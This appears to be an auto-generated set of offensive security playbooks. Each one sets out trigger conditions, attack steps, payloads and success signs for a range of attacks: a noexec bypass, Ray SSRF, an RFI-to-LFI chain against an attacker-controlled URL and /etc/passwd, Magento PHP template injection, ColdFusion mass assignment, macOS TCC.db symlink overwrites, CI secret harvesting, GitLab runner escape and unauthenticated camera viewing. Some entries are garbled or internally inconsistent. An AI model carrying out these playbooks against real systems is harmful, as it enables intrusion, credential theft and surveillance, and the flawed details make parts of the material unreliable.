meta.title: Bypassing a noexec by elf roping

affected_components: File upload functionality within a noexec environment
tech_stack_fingerprints: Presence of ld.so and libc.so in the chroot environment
Dynamic executables with no PROT_EXEC segments can be loaded

trigger_conditions.when_to_apply: When file upload is possible but the upload directory has noexec permissions, and the target environment has dynamic executables, ld.so, and libc.so accessible within a chrooted environment.
prerequisites: Ability to upload files to a location within the chroot environment
The upload directory is mounted with the noexec option
The target binary is a dynamic executable
Access to ld.so and libc.so
The environment is chrooted and has no shell
applicability_signals: File upload is possible.
Attempting to execute uploaded ELF binary fails due to noexec permissions.
ld.so and libc.so are accessible.
ASLR is present but memory locations of ld.so and uploaded ELF are fixed relative to each other.
Kernel refuses to mmap part of a file on a nonexec fs with PROT_EXEC.
skip_if: No file upload functionality.
Upload directory is not noexec.
No access to ld.so or libc.so.
Target environment is not chrooted or has a shell.
Kernel allows mmap with PROT_EXEC on noexec file systems.

recon_steps: Step 1: Upload a simple ELF binary (e.g., a minimal C program compiled with `gcc -static -o simple_elf simple_elf.c`) to the target upload directory and attempt to execute it directly. Observe the 'Permission denied' or similar error due to noexec.
Step 2: Attempt to execute the uploaded ELF binary via the loader: `/lib/ld.so /tmp/uploaded.bin`. Observe if this bypasses the noexec. If not, proceed with further steps.
Step 3: Inspect the memory layout of ld.so and the uploaded ELF binary to confirm that their memory locations are fixed relative to each other, even with ASLR.
Step 4: Identify a suitable ROP gadget within libc.so or the target binary that can modify the stack pointer or call `longjmp`.
attack_steps: Step 1: Craft an ELF binary that has no PROT_EXEC segments, ensuring it can be mapped by ld.so and the kernel without violating noexec. This binary will serve as the loader for our ROP chain.
Step 2: Modify the ELF binary's entry point to point to a location that triggers the `longjmp` call within ld.so, or a similar function that allows stack manipulation.
Step 3: Abuse ELF relocations to ensure that the `longjmp` call uses a stack pointer that points to attacker-controlled memory. This is done by specifying the addendum within the relocation entry.

Step 4: Construct a ROP chain in the attacker-controlled memory region that the modified stack pointer will point to. This ROP chain should perform the desired actions, such as allocating memory, making it executable (`mprotect`), and executing shellcode.
payloads_or_patterns: Crafted ELF binary with no PROT_EXEC segments.
ELF relocation entries to control `longjmp`'s stack pointer.
ROP chain using gadgets from libc.so and the target binary.
tools_recommended: objdump: To analyze ELF structures and identify gadgets.
readelf: To inspect ELF headers, sections, and symbols.
Custom ELF manipulation tools: For patching entry points and relocation entries.
ROPgadget: To find suitable ROP gadgets.
success_indicators: Successful execution of arbitrary code within the chrooted environment.
A callback from the target environment to an attacker-controlled server.
Obtaining a shell or performing privileged actions within the chrooted environment.
failure_indicators: Crashing of ld.so or the target process.
Errors related to invalid memory access or segmentation faults.
No observable code execution or callbacks.
If `longjmp` or similar stack manipulation functions are not present or not exploitable.

playbooks.impact: Local Privilege Escalation within a restricted chrooted environment, bypassing noexec restrictions to execute arbitrary code.
playbooks.key_lesson: When facing noexec restrictions on file uploads, consider leveraging the dynamic linker (ld.so) and ELF relocations to control execution flow and bypass the noexec mount option, especially when `longjmp` or similar stack manipulation functions are available.

meta.title: Anyscale (Ray) Vulnerabilities: SSRF, RCE, Missing Authentication

trigger_conditions.when_to_apply: When the Ray Dashboard or Ray Client is exposed to the internet or an untrusted network, and specific endpoints are accessible without proper authentication or input validation.
prerequisites: Target is running Anyscale (Ray) versions 2.6.3 or 2.8.0
Internet access to the Ray Dashboard or a way to interact with the Ray Client
applicability_signals: Exposed Ray Dashboard UI
Ray Client available for interaction
Endpoints that accept user-controlled input for external resource fetching or command execution
skip_if: Ray is running exclusively in a trusted, isolated internal network
All sensitive endpoints return authentication errors for unauthenticated users
WAF or other security controls prevent exploitation attempts

recon_steps: Step 1: Identify exposed Ray Dashboard instances by scanning common ports (e.g., 8265) or by observing network traffic.
Step 2: Attempt to interact with the Ray Client to understand available functionalities and potential interaction points with the backend services.
attack_steps: Step 1: Identify and interact with endpoints that accept user-supplied URLs or data for processing (e.g., for fetching files, retrieving data).
Step 2: Craft SSRF payloads by providing URLs pointing to internal services or attacker-controlled infrastructure (e.g., Burp Collaborator).
Step 3: For RCE, look for endpoints that allow command execution or deserialization of untrusted data. If found, craft malicious payloads to achieve code execution.
Step 4: If authentication bypass is suspected, enumerate user roles or access controls to gain higher privileges.
payloads_or_patterns: SSRF: http://<TARGET_URL>:8265/./{{'secret'|urlencode}}
SSRF: http://localhost:8265/./{{'secret'|urlencode}}
RCE: Dependent on specific vulnerable endpoint, often involves serialized objects or command injection strings.
tools_recommended: Burp Suite: For intercepting and modifying requests, scanning for endpoints, and detecting SSRF callbacks.
Nmap: For port scanning and service detection.
Ray Client library (Python): For programmatic interaction with Ray.
success_indicators: SSRF: Callback received on attacker-controlled server (e.g., Burp Collaborator) when the target fetches a URL.
RCE: Execution of a command on the target server, indicated by a specific output or a reverse shell connection.
Authentication Bypass: Ability to access sensitive dashboard features or data without proper authentication.
failure_indicators: All requests return 401 or 403: Indicates strong authentication is enforced. Pivot to other attack vectors.
No callbacks for SSRF attempts: The target might be blocking outbound connections or not processing URLs as expected. Re-evaluate the target's network configuration or explore different entry points.
Command execution attempts result in errors: The input sanitization might be too strict, or the execution context is too restricted. Try different command injection techniques or payloads.

playbooks.impact: Unauthorized access to sensitive information, remote code execution leading to system compromise, denial of service, and potential lateral movement within the network.
playbooks.key_lesson: Always validate and sanitize user-supplied URLs and data to prevent SSRF and RCE vulnerabilities, especially when dealing with distributed systems like Ray.

meta.title: Unmasking an RFI to LFI Escalation

trigger_conditions.when_to_apply: When an application endpoint fetches external files via a URL parameter and processes them as CSV, and it logs/saves uploaded files with unique IDs that are retrievable.
prerequisites: The target must have an endpoint that accepts a 'file' parameter pointing to an external URL.
The application must process the fetched file as CSV.
The application must log and save files, assigning them unique IDs.
There must be a mechanism to retrieve these saved files using their IDs.
applicability_signals: Endpoint like /redacted/redacted/redacted?file=https://...
Analysis of JavaScript files reveals endpoints for logging/saving files with IDs.
Developer logic treats all fetched files as CSV using a `csvread` function.
skip_if: Input validation strictly enforces only specific domain whitelists for the 'file' parameter.
No discernible mechanism for retrieving saved files by ID.
The application does not log or save fetched files.

recon_steps: Identify endpoints that accept a 'file' parameter pointing to a URL.
Analyze JavaScript files for endpoints related to file uploads, logging, or retrieval using IDs.
Examine the behavior of the identified endpoint when fetching files from various sources (e.g., public S3 buckets, ngrok URLs).
attack_steps: Step 1: Attempt RFI by providing a URL to an attacker-controlled server that serves a malicious CSV file. Example: private.com/redacted/redacted/redacted?file=https://attacker-controlled.com/malicious.csv
Step 2: Observe if products are added to the account or if any data is processed based on the malicious CSV content.

Step 3: Analyze server-side logs or application behavior for evidence of file saving and ID assignment when fetching a file. For example, try fetching a file like /etc/passwd from the target server itself by setting `file=/etc/passwd` (assuming the backend is designed to fetch local files if presented as the 'file' parameter).
Step 4: If a file is saved and assigned an ID, identify the endpoint used for retrieving files by their ID.
Step 5: Construct a request to retrieve the saved file using the identified ID and the target's file retrieval endpoint. This could reveal sensitive information like the contents of /etc/passwd.
payloads_or_patterns: private.com/redacted/redacted/redacted?file=https://<ATTACKER_CONTROLLED_URL>/file.csv
private.com/redacted/redacted/redacted?file=/etc/passwd
URL pattern for retrieving files by ID: e.g., private.com/api/files/get?id=<FILE_ID>
tools_recommended: Burp Suite: To intercept and modify requests, analyze responses, and craft malicious CSV files.
ngrok: To expose a local server for receiving RFI callbacks or serving malicious files.
A simple web server (e.g., Python's http.server): To serve malicious CSV files.
success_indicators: Products being added to an authenticated account without explicit user action (RFI/CSRF).
Discovery of a file ID after attempting to fetch a local file like /etc/passwd.
Successful retrieval of sensitive file contents (e.g., /etc/passwd) using the file ID.
Application error messages indicating file processing failures or successes.
failure_indicators: No products are added to the account, and no file ID is generated when attempting to fetch local files.
URL validation rejects local file paths or non-HTTP(S) schemes.
Responses consistently show errors related to file parsing or access, but no sensitive data is revealed.
The application fails to save or assign IDs to fetched files.

playbooks.impact: Allows an attacker to read sensitive local files from the server, such as configuration files (/etc/passwd), application source code, or private keys, by leveraging a remote file inclusion vulnerability that mishandles file processing and saving.
playbooks.key_lesson: Treat fetched files with extreme caution, especially when they are processed as data (e.g., CSV). Sanitize and validate all input, and ensure that files fetched from external or internal sources are not treated as arbitrary data or code that can lead to Local File Inclusion or other vulnerabilities.

meta.title: Account takeover through register functionnality

trigger_conditions.when_to_apply: This technique is applicable when the target application allows registration with user-provided email addresses and does not properly sanitize or validate these inputs before creating new accounts.
prerequisites: An existing user account on the target application.
applicability_signals: The registration endpoint accepts user-provided email addresses.
The application creates new accounts using email addresses without robust validation for existing users.
skip_if: The registration endpoint rejects emails with special characters like '#'.
The application performs immediate email verification before account creation, preventing subsequent registrations with the same base email.

recon_steps: Step 1: Identify the registration endpoint and observe the expected input parameters.
Step 2: Attempt to register with a known victim email address to confirm it's already in use.
attack_steps: Step 1: Create a standard account with a victim's email address (e.g., victim@test.com).
Step 2: In a separate session (e.g., using Burp Suite's Repeater or a different browser profile), navigate to the registration page.
Step 3: Attempt to register a new account using the same victim email address but appending a '#' character (e.g., victim@test.com#) and a different password.
Step 4: If successful, log in with the new password associated with the modified email address.
payloads_or_patterns: <VICTIM_EMAIL>#
Example: victim@test.com#
tools_recommended: Burp Suite (for intercepting and modifying registration requests)
Multiple browser profiles or incognito windows
success_indicators: Successful creation of a new account using the modified email address.
Ability to log in to the victim's account using the attacker-provided password.
The application does not flag the registration as a duplicate or error when '#' is appended.
failure_indicators: Registration request returns an error indicating the email is already in use, even with the '#' appended.
The application normalizes the email address and still considers it a duplicate before allowing registration.
The attacker can't log in with the new password after successful registration, indicating the registration didn't fully associate with the victim's account.

playbooks.impact: An attacker can gain full control over any existing user's account on the target application by exploiting the registration functionality, without needing the victim's password. This allows for data access, unauthorized actions, and potential further exploitation.
playbooks.key_lesson: Always sanitize and validate email inputs during registration to prevent the use of special characters that could lead to account enumeration or takeover.

meta.title: Zeal Wallet Browser Extension and Backend Security Audit Report (Q3 2023)

trigger_conditions.when_to_apply: This SSRF vulnerability can be exploited when the application makes external requests based on user-provided input, such as URLs for fetching resources or API endpoints.
prerequisites: insufficient detail in writeup
applicability_signals: insufficient detail in writeup
skip_if: insufficient detail in writeup

recon_steps: Analyze the application's functionality to identify any feature that accepts URLs or resource locators as input.
Examine network traffic to observe how the application handles external resource requests.

Craft a payload containing a URL that points to an internal resource or a sensitive external service.
Submit the crafted payload to the application.
Monitor the application's response and network traffic for any signs of the request being forwarded or processed.
payloads_or_patterns: http://<TARGET_URL>/internal/resource
http://127.0.0.1:<PORT>/admin
http://<INTERNAL_IP_ADDRESS>
tools_recommended: Burp Suite: Proxy and Repeater to intercept and modify requests, Collaborator for detecting SSRF callbacks.

The application returns information from an internal resource.
A callback is received on an attacker-controlled server (e.g., Burp Collaborator).
failure_indicators: The application rejects the crafted URL with an error message indicating it's invalid or disallowed (e.g., "Invalid URL", "Access denied").

No external request is observed, or the request is made to the expected external service and not the attacker-controlled URL. In such cases, try different SSRF bypass techniques or target different parameters.

meta.title: Visual Studio Code Security: Finding New Vulnerabilities in the NPM Integration (3/3)
meta.category: RCE, Argument injection, Security code review

tech_stack_fingerprints: VS Code specific UI elements or behavior (implied by article focus)

trigger_conditions.when_to_apply: When the NPM integration in VS Code allows for external command execution or argument manipulation, potentially through package.json scripts or other configuration files that are processed by VS Code.
prerequisites: Attacker can influence the content of a project's package.json file or related NPM configuration files within a VS Code workspace.
applicability_signals: NPM commands are executed by VS Code, and their arguments are not properly sanitized or validated.
VS Code provides features that interact with NPM scripts or dependencies in a way that could be manipulated.
skip_if: All NPM commands executed by VS Code are properly sandboxed and arguments are strictly validated against an allowlist.

recon_steps: Step 1: Analyze the VS Code source code or documentation related to its NPM integration to understand how it executes NPM commands and processes package.json files.
Step 2: Identify specific NPM commands or scripts that VS Code invokes and examine the arguments passed to them for potential injection points.
attack_steps: Step 1: Craft a malicious `package.json` file with a script that attempts to inject arguments into an NPM command executed by VS Code.
Step 2: For example, if VS Code runs `npm install --force <package_name>`, attempt to inject commands via `<package_name>`.
Step 3: Observe the execution flow and any unintended commands or arguments being passed.
payloads_or_patterns: Example for `package.json`'s `scripts` section: `"postinstall": "evil_command --arg=$(whoami)"` - This would only work if VS Code executes `npm run postinstall` and passes its output as an argument to another command.

A more direct example for argument injection might involve a script that VS Code calls directly, e.g., if VS Code calls `npm install <dependency>`, try to control `<dependency>` to include shell metacharacters or command arguments.
tools_recommended: Burp Suite (for analyzing network requests if any are made by the integration)
Code analysis tools (e.g., static analysis tools, disassemblers) to understand VS Code's internal workings.
success_indicators: Execution of arbitrary commands on the user's system when VS Code interacts with NPM.
Error messages that indicate unintended commands were executed or arguments were parsed in an unexpected way.
failure_indicators: NPM commands execute normally without any unexpected behavior or command execution.
VS Code sanitizes all user-provided input for NPM commands, preventing injection.

playbooks.impact: Remote Code Execution (RCE) on the user's machine by tricking VS Code's NPM integration into executing arbitrary commands.
playbooks.key_lesson: When integrating with external tools like NPM, meticulously validate and sanitize all arguments passed to commands to prevent argument injection vulnerabilities.

meta.title: Magento Template Engine, A Story Of CVE-2022-24086

trigger_conditions.when_to_apply: This vulnerability is applicable when the target application sends emails that are processed by the Magento template engine, particularly when user-provided content is included in these emails via features like wishlist sharing.
prerequisites: The target must be using a vulnerable version of Magento.
An authenticated user must be able to trigger an email sending functionality that utilizes the template engine with user-controlled input.
applicability_signals: User-provided data appearing within email templates during wishlist sharing.
The presence of `{{var message|raw}}` or similar directives in email templates.
skip_if: The target is using a patched version of Magento.
No user-controlled input is processed by the template engine in email content.

recon_steps: Step 1: Identify areas in the Magento application where user-supplied text is rendered in emails. The wishlist sharing feature is a prime candidate.

Step 2: Inspect the source code of email templates to understand how user input (e.g., 'message' field) is processed and if it's passed through the `filter` method of `Magento/Framework/Filter/Template.php` with `|raw` encoding.
attack_steps: Step 1: As an authenticated user, navigate to the wishlist sharing feature.

Step 2: In the message field provided for the email recipient, inject a specially crafted payload designed to exploit the template engine's vulnerability. The payload should leverage the `{{var message|raw}}` directive.
Step 3: Send the shared wishlist email.
Step 4: Analyze the received email for signs of template rendering or code execution.
payloads_or_patterns: {{var message|raw}} {{php echo 'test' //}}
{{var message|raw}} {{php echo $_SESSION['user_id'] //}}
tools_recommended: Burp Suite: To intercept and modify the wishlist sharing request, injecting payloads.
Magento instance: To test the vulnerability directly by triggering email sends.
success_indicators: The injected PHP code is executed and its output is visible within the received email (e.g., the string 'test' is rendered).
Sensitive information (like session data or user IDs) is leaked into the email content.
failure_indicators: The payload is rendered as plain text and no PHP code execution occurs. This might indicate insufficient privileges or a Web Application Firewall (WAF) blocking the payload. In such cases, try alternative payloads or different input vectors if available.

playbooks.impact: Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE). An attacker can execute arbitrary PHP code on the server, potentially leading to full system compromise.
playbooks.key_lesson: Always scrutinize how user-controlled input is processed by template engines, especially when directives like `|raw` are used, as this can lead to SSTI and subsequent RCE.

meta.title: Critical Variable Mass Assignment Vulnerability in Adobe ColdFusion (CVE-2023-44350)

tech_stack_fingerprints: ColdFusion specific syntax in source code (e.g., <cfcomponent>, <cffunction>, <cfscript>)

trigger_conditions.when_to_apply: When a target application exposes remote CFC methods (functions marked with access='remote' in .cfc files) that do not adequately validate or sanitize input passed via the 'argumentCollection' parameter, or individual parameters that can be mapped to arbitrary variable scopes.
prerequisites: Ability to make HTTP requests to the target application.
Knowledge of or ability to discover remote CFC methods.
A user account with any level of authentication to trigger remote CFC methods, if required.
applicability_signals: Endpoints with `.cfc` extension and `method=` parameters.
CFC methods defined with `access='remote'`.
Function signatures that accept parameters which might map to sensitive scopes (e.g., `server`, `application`, `request`).
skip_if: All remote CFC methods strictly validate all input parameters and do not allow arbitrary variable assignments.
ColdFusion server configuration explicitly disables remote CFC execution or limits accessible scopes.
WAF blocks requests containing WDDX or JSON payloads for 'argumentCollection'.

recon_steps: Step 1: Enumerate .cfc files and their remote methods on the target application. Look for endpoints like /path/to/component.cfc?method=<remote_method_name>.
Step 2: For identified remote methods, examine their expected arguments. If possible, review the source code of the CFC files to understand which variable scopes are accessible and modifiable.
attack_steps: Step 1: Identify a remote CFC method that accepts an 'argumentCollection' parameter or individual parameters that could map to different scopes.
Step 2: Craft an HTTP POST request to the identified CFC endpoint with `Content-Type: application/x-www-form-urlencoded`.

Step 3: Include a malicious `argumentCollection` parameter containing a JSON or WDDX payload. The payload should attempt to overwrite sensitive variables in scopes like 'server', 'application', or 'request'. For example, try to overwrite 'Server.Application.CFIDE.administrator.authorized' or similar authorization-related variables.

Step 4: If direct parameter mapping is possible, send requests with parameters that are not declared in the CFC function signature but could potentially be assigned to various scopes. Example: POST /some.cfc?method=xyzzy&<param_name>=<payload_value> where <param_name> is not 'one' or 'two'.
payloads_or_patterns:
POST <TARGET_URL>/path/to/component.cfc?method=<remote_method_name> HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/x-www-form-urlencoded

argumentCollection={"<variable_name>":"<malicious_value>"}

POST <TARGET_URL>/path/to/component.cfc?method=<remote_method_name> HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/x-www-form-urlencoded

<PARAM_NAME>=<malicious_value>
tools_recommended: Burp Suite: To intercept and modify HTTP requests. Use Intruder to fuzz parameter names and values.
ffuf or Gobuster: For discovering .cfc files and remote methods if not readily apparent.
success_indicators: Unexpected application behavior: e.g., bypassing authentication after overwriting an authorization variable.
Response indicates modification of server-side variables (e.g., reflected values from altered scopes).
Ability to access sensitive administrative functions or data that should be restricted.
failure_indicators: 400 Bad Request or 404 Not Found for payloads targeting unknown variables or scopes.
Responses indicating the original, unmodified behavior of the CFC method.
200 OK but no observable change in application behavior or security controls: Try different variable names, scopes, or payloads. Consider fuzzing for less obvious CFC methods.

playbooks.impact: An attacker can overwrite arbitrary variables in various scopes, potentially leading to unauthorized access to sensitive data, execution of arbitrary code (if writable scopes can control execution flow), bypassing security controls, or disrupting application functionality. The specific impact depends on the targeted CFC method and the variables it can manipulate.
playbooks.key_lesson: Always validate and sanitize all input, especially when passed via 'argumentCollection' or other mechanisms that can map to arbitrary application or server scopes in languages like ColdFusion. Ensure that user-controlled data cannot overwrite critical security or application logic variables.

meta.title: sqlol (CVE-2023-32422) - a macOS TCC bypass

affected_components: Applications using libsqlite compiled with SQLITE_ENABLE_SQLLOG
tech_stack_fingerprints: Applications compiled with SQLITE_ENABLE_SQLLOG preprocessor symbol

trigger_conditions.when_to_apply: When an application on macOS uses libsqlite and is compiled with the SQLITE_ENABLE_SQLLOG preprocessor symbol, allowing an attacker to control the SQLITE_SQLLOG_DIR environment variable.
prerequisites: Target application must use libsqlite compiled with SQLITE_ENABLE_SQLLOG.
Attacker must be able to set environment variables for the target application.
applicability_signals: Observable environment variables related to SQLite logging, specifically 'SQLITE_SQLLOG_DIR'.
skip_if: libsqlite is not used, or not compiled with SQLITE_ENABLE_SQLLOG.
Environment variables cannot be manipulated for the target process.

recon_steps: Step 1: Identify applications on macOS that utilize libsqlite and are potentially compiled with the SQLITE_ENABLE_SQLLOG flag. This may involve static analysis of binaries or observing application behavior.

Step 2: Attempt to set the SQLITE_SQLLOG_DIR environment variable to a path controlled by the attacker before launching or interacting with identified applications. Observe if debug files are created in the specified directory.
attack_steps: Step 1: Set the SQLITE_SQLLOG_DIR environment variable to a writable directory controlled by the attacker, e.g., '/tmp/attacker_logs'.
Step 2: Execute an application that uses libsqlite compiled with SQLITE_ENABLE_SQLLOG. If the application opens any SQLite databases, debug files will be written to the attacker-controlled directory.
Step 3: Analyze the generated files: 'sqllog_N.db' (database copy), 'sqllog_N.sql' (SQL statements), and 'sqllog.idx' (index). These files can reveal sensitive information from SQLite databases.
Step 4: For TCC bypass, leverage the fact that the open() system calls follow symlinks and can overwrite files. Use symlinks to point to critical system files like TCC.db.
Step 5: Craft malicious SQL statements or database dumps that, when written by libsqlite's logging mechanism, overwrite TCC.db in a way that grants broader permissions.
payloads_or_patterns: Environment variable: SQLITE_SQLLOG_DIR=<ATTACKER_CONTROLLED_DIR>
Symlink creation: ln -s /System/Library/PrivateFrameworks/TCC.framework/Versions/A/Resources/TCC.db /tmp/attacker_logs/sqllog_1.db
Crafted SQL statements to overwrite TCC.db entries
tools_recommended: Standard macOS command-line tools for environment variable manipulation (export), symlink creation (ln), and file analysis (cat, hexdump).
Debuggers (lldb) or reverse engineering tools (radare2, Ghidra) to identify applications compiled with SQLITE_ENABLE_SQLLOG.
success_indicators: Creation of 'sqllog_N.db', 'sqllog_N.sql', and 'sqllog.idx' files in the directory specified by SQLITE_SQLLOG_DIR.
Successful overwriting of TCC.db, leading to unauthorized access to TCC-protected resources (e.g., microphone, webcam, contacts, location).
failure_indicators: No debug log files are created, indicating the application does not use libsqlite or is not compiled with SQLITE_ENABLE_SQLLOG. Pivot to other exploitation vectors.
Attempts to overwrite TCC.db result in crashes or data corruption without granting elevated privileges. Suggest exploring alternative privileged targets or refining the overwrite payload.

playbooks.impact: Attacker can leak any SQLite database accessible by the application, and by leveraging symlinks and the overwrite capability, can overwrite the TCC.db file to gain complete access to TCC-protected data and functionalities, including contacts, location, microphone, and webcam.
playbooks.key_lesson: Always investigate peculiar environment variables in privileged applications, as they may enable dangerous debugging functionalities that were not intended for production environments. Pay close attention to file write operations, especially when they can follow symlinks and overwrite existing files.

meta.title: All the Small Things: Azure CLI Leakage and Problematic Usage Patterns

tech_stack_fingerprints: GitHub Actions workflows utilizing Azure CLI commands
Azure CLI commands like 'az webapp config appsettings'

trigger_conditions.when_to_apply: When a CI/CD pipeline uses Azure CLI commands that interact with application settings, configuration, or secrets, and these commands' output is logged.
prerequisites: Access to view CI/CD pipeline logs (e.g., GitHub Actions logs).
applicability_signals: Presence of 'az webapp config appsettings' or similar Azure CLI commands in CI/CD scripts.
Observation of Azure CLI commands in public or private code repositories that might expose environment variables or secrets.
skip_if: Azure CLI is not used in the CI/CD pipeline.
CI/CD logs are not accessible or are heavily redacted.

recon_steps: Step 1: Search GitHub (or other code hosting platforms) for CI/CD workflows that utilize Azure CLI commands, specifically looking for commands like 'az webapp config appsettings', 'az aks update', or commands that modify application settings or secrets.
Step 2: Identify workflows where these commands are executed and check if there's an option to view the build/run logs.
attack_steps: Step 1: Navigate to the CI/CD pipeline runs (e.g., GitHub Actions) for identified repositories.
Step 2: Examine the logs of workflow runs where Azure CLI commands were executed.
Step 3: Look for output lines that echo sensitive information such as application settings, connection strings, API keys, or other environment variables being set or accessed by the Azure CLI.
Step 4: Collect the leaked credentials or sensitive information.
payloads_or_patterns: az webapp config appsettings set --resource-group <resource-group> --name <app-name> --settings KEY1=<value1> KEY2=<value2>
az aks update --resource-group <resource-group> --name <cluster-name> --add-node-resource-group <rg-name>
tools_recommended: GitHub code search (or similar platform search)
Browser developer tools (to inspect network requests and responses if dynamic loading occurs)
Burp Suite (to analyze traffic if applicable, though primarily log-based)
success_indicators: Azure CLI command output in the CI/CD logs clearly shows sensitive environment variables, connection strings, or secrets being printed.
Identification of leaked credentials (e.g., API keys, database passwords) within the CI/CD logs.
failure_indicators: Azure CLI commands execute without printing sensitive variables to the logs.
CI/CD logs do not contain sensitive information or are properly redacted.

playbooks.impact: Exposure of sensitive application settings, connection strings, API keys, or other secrets used by Azure resources. This can lead to unauthorized access, data breaches, privilege escalation, or further compromise of cloud infrastructure.
playbooks.key_lesson: Always review CI/CD pipeline logs for Azure CLI commands that modify application settings or secrets, as they may unintentionally leak sensitive information to the logs, especially in public repositories.

meta.title: OMGCICD - Attacking GitLab CI/CD Via Shared Runners

trigger_conditions.when_to_apply: When a single shared GitLab CI/CD runner is configured to execute pipelines for multiple projects, especially when some projects handle sensitive deployments while others do not.
prerequisites: Attacker has the ability to commit changes to the `.gitlab-ci.yml` file in a project that uses shared runners.
The shared runner is configured with the Docker-in-Docker (dind) executor without proper isolation.
applicability_signals: Shared runners are documented as being used across different projects with varying levels of sensitivity.
Observation of `.gitlab-ci.yml` files that can be modified by the attacker.
Investigating runner configurations to confirm the use of dind executor without strong isolation.
skip_if: Each project has dedicated, isolated runners.
All pipelines are executed on air-gapped or highly secured runners with strict access controls.
The runner configuration explicitly enforces strong isolation between job containers.

recon_steps: Step 1: Identify if the target environment utilizes GitLab CI/CD and shared runners.
Step 2: Determine which projects utilize the shared runners and assess their sensitivity (e.g., production deployments vs. test projects).
Step 3: Investigate the runner configuration, specifically if the Docker-in-Docker (dind) executor is in use. Look for evidence of job isolation or lack thereof.
attack_steps: Step 1: Inject a malicious job into the `.gitlab-ci.yml` file of a low-privilege project that uses the shared runner. This job should aim to establish persistence or exfiltrate data.
Step 2: The malicious job should attempt to break out of the job's container or interact with other containers/host system if isolation is weak.
Step 3: If successful in escaping or gaining access to the runner's environment, the attacker can then monitor or interfere with high-privilege jobs executing on the same runner.
Step 4: Capture credentials or sensitive information exposed by high-privilege jobs (e.g., deployment keys, API tokens).
payloads_or_patterns: Malicious `.gitlab-ci.yml` entry using Docker-in-Docker executor with commands to interact with the host or other containers, e.g., `docker ps`, `cat /root/.kube/config` (if Kubernetes executor is also present or accessible).
tools_recommended: GitLab CI/CD interface for modifying `.gitlab-ci.yml`
Custom scripts or tools to interact with Docker or Kubernetes environments if an escape is achieved.
success_indicators: Access to credentials or sensitive data from other projects' pipelines (e.g., production deployment tokens).
Ability to execute commands on the shared runner's host system or within other job containers.
Successful exfiltration of data that should be isolated.
failure_indicators: Malicious pipeline jobs fail to execute or are blocked by GitLab's CI/CD security policies.
No observable interaction with other jobs or the runner host system, indicating strong isolation.
Runner environment correctly restricts access to host resources or other containers.

playbooks.impact: An attacker can steal production deployment credentials, gain access to sensitive data processed by other pipelines, and potentially take control of production systems deployed by the compromised runner.
playbooks.key_lesson: Ensure strong isolation for GitLab CI/CD shared runners, especially when using executors like Docker-in-Docker, to prevent job-to-job and host-level compromise.

meta.title: Tapping into a telecommunications company’s office cameras
meta.vuln_type: Missing Authentication for Sensitive Data Exposure

trigger_conditions.when_to_apply: This technique is applicable when an API endpoint serving live camera feeds or event streams is accessible without any authentication.
prerequisites: The target system must host live camera feeds or event streams.
applicability_signals: Existence of an API endpoint that returns streaming data (e.g., Server-Sent Events or JSON stream).
The API endpoint is publicly accessible and does not require an authentication token.
skip_if: The API endpoint requires any form of authentication (e.g., session token, API key).
The API endpoint returns an error (e.g., 401, 403) for unauthenticated requests.

recon_steps: Step 1: Analyze the JavaScript source code of the web application, particularly using source maps if available, to identify API endpoints related to camera feeds or streaming data.

Step 2: Test identified streaming API endpoints by sending unauthenticated requests using tools like `curl` or Postman to check for data exposure and observe response types (e.g., event stream, JSON).
attack_steps: Step 1: Send an unauthenticated GET request to the identified streaming API endpoint (e.g., `https://<TARGET_URL>/api/events/incident-events`).
Step 2: Continuously read the response stream.
Step 3: Parse each incoming message from the stream, expecting a JSON format containing camera information and raw image data.
Step 4: Decode the base64 encoded `raw_image` data.
Step 5: Render the decoded image data to visualize the live camera feed.
payloads_or_patterns:
GET <TARGET_URL>/api/events/incident-events HTTP/1.1
Host: <TARGET_HOST>

(Observe and parse stream data for 'raw_image' field)
tools_recommended: Burp Suite: To intercept and analyze HTTP requests and responses to streaming endpoints.
curl: For direct testing of API endpoints and stream capturing.
Custom script (Python, C#, etc.): To automate the process of reading, parsing, and displaying the image stream data.
success_indicators: Receiving a continuous stream of data from the API endpoint.
Successfully parsing JSON messages from the stream that contain image data.
Decoding and displaying live camera feed images without authentication.
failure_indicators: Receiving a 401 or 403 status code on the API request, indicating authentication is required.
Receiving malformed or empty data from the stream, suggesting the endpoint is not behaving as expected.
Unable to decode or render the image data, possibly due to incorrect parsing or invalid base64 encoding.

playbooks.impact: Attacker can view live camera feeds from the telecommunications company's offices, leading to a significant privacy violation and potential exposure of sensitive operational information.
playbooks.key_lesson: Always verify that API endpoints exposing sensitive data, such as live camera feeds or event streams, are properly protected by authentication mechanisms.

meta.title: lateralus (CVE-2023-32407) - a macOS TCC bypass

tech_stack_fingerprints: Environment variable MTL_DUMP_PIPELINES_TO_JSON_FILE is utilized by Metal framework.

trigger_conditions.when_to_apply: When an application on macOS utilizes the Metal framework and can be influenced by environment variables, especially when targeting applications with File Data Access (FDA) entitlements.
prerequisites: The target macOS system must have applications that depend on the Metal framework.
The attacker must be able to influence environment variables for a running process or launch a process with controlled environment variables.
applicability_signals: Observation of applications using the Metal framework.
Identification of applications with FDA entitlements.
The existence of a mechanism to set environment variables for target processes.
skip_if: The target application does not use the Metal framework.
There is no way to inject or control environment variables for the target application.
The system has strict sandboxing or security controls that prevent arbitrary file writes or renames by the targeted application.

recon_steps: Identify applications on macOS that utilize the Metal framework.
Check for applications with File Data Access (FDA) entitlements.
Determine if there are any mechanisms to control environment variables for these applications (e.g., through launch scripts, configuration files, or direct process launching).
attack_steps: Step 1: Launch a target application (e.g., Music) with the environment variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` set to a controllable path. For example: `env MTL_DUMP_PIPELINES_TO_JSON_FILE=/tmp/outputdir`. The exact path will be used as a prefix for the temporary file.

Step 2: Trigger an action within the application that causes the Metal framework to write debug data. This might involve playing music, accessing certain features, or performing any operation that could engage Metal.

Step 3: Observe the filesystem at the specified output directory. A temporary file named `.dat.nosyncXXXX.XXXXXX` will be created. The application then attempts to rename this temporary file to `outputdir/lateralus` (or whatever the final part of the `MTL_DUMP_PIPELINES_TO_JSON_FILE` path was).

Step 4: Exploit the `rename()` race condition. By carefully timing the creation of a file or directory at the destination path before the rename operation completes, an attacker can potentially trick the `rename()` operation into overwriting or replacing arbitrary files. This requires understanding the specific `rename()` behavior and the timing of the Metal framework's file operations. The writeup mentions `rename()` resolving paths separately and the potential for a race condition, but does not provide explicit steps for exploiting it.

Step 5: If the race condition is successful, the attacker can gain the ability to write to arbitrary file locations or replace existing files, potentially leading to privilege escalation or other malicious actions.
